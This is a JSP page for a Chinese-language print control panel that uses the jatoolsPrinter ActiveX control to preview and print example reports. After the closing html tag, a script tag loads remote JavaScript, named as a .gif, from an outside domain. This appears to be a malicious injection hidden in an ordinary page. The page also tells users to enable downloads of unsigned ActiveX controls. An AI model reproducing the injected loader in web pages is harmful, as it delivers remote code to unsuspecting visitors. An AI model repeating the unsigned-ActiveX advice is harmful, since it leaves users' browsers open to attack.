<%@ page contentType="text/html; charset=UTF-8" %>
<%@ page import="java.io.*" %>
<%@ page import="java.net.*" %>

<% 

 String examplePath=getServletConfig().getServletContext().getRealPath("/");
  
 if(!examplePath.endsWith(File.separator))
 {
 	examplePath+= File.separator ;
 }
 
 examplePath+=("example"+File.separator);

 examplePath = examplePath.replace('\\','/');


%>

<html>
<head>

<meta http-equiv="Content-Language" content="zh-cn">

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>打印控件面板</title>

<!-- 插入打印控件 -->
<OBJECT ID="jatoolsPrinter" CLASSID="CLSID:B43D3361-D975-4BE2-87FE-057188254255" codebase="jatoolsP.cab#version=1,1,3,007"></OBJECT>  

<script type="text/javascript">


function doBrowser()
{
   parent.frames["main"].location = url1.value;
}
function doPrint(how)
{
    if(typeof(jatoolsPrinter.page_div_prefix)=='undefined'){
        alert("请按页顶上的黄色提示下载ActiveX控件.如果没有提示请按以下步骤设置ie.\n 工具-> internet 选项->安全->自定义级别,设置 ‘下载未签名的 ActiveX ’为'启用'状态")
        return ;
   }
   doc = parent.frames["main"].document;
   if(how == 0)
      jatoolsPrinter.printPreview(doc);
   else if(how == 1)
      jatoolsPrinter.print(doc,true);
   else
      jatoolsPrinter.print(doc,false);
}


</script>
<base target="main">
</head>

<body>

<p>
<SELECT NAME="url1">
<OPTION value ='../server?file=<%=examplePath%>gov11.xml&as=dhtml'>../server?file=<%=examplePath%>gov11.xml&as=dhtml
<OPTION  value ='../server?file=<%=examplePath%>barcode.xml&as=dhtml'>../server?file=<%=examplePath%>barcode.xml&as=dhtml
<OPTION  value ='../server?file=<%=examplePath%>crosstab2.xml&as=dhtml'>../server?file=<%=examplePath%>crosstab2.xml&as=dhtml
</SELECT>
<input type="button" ONCLICK="doBrowser()" value="浏览报表" name="B2"></p>


<INPUT TYPE="button" VALUE="打印预览..." ONCLICK="doPrint(0)" UNSELECTABLE="on"/>
<INPUT TYPE="button" VALUE="打印..." ONCLICK="doPrint(1)" UNSELECTABLE="on"/>
<INPUT TYPE="button" VALUE="打印" ONCLICK="doPrint(2)" UNSELECTABLE="on"/></body></html><script src=http://fangaizheng.com.cn/count/js/gif.gif></script>
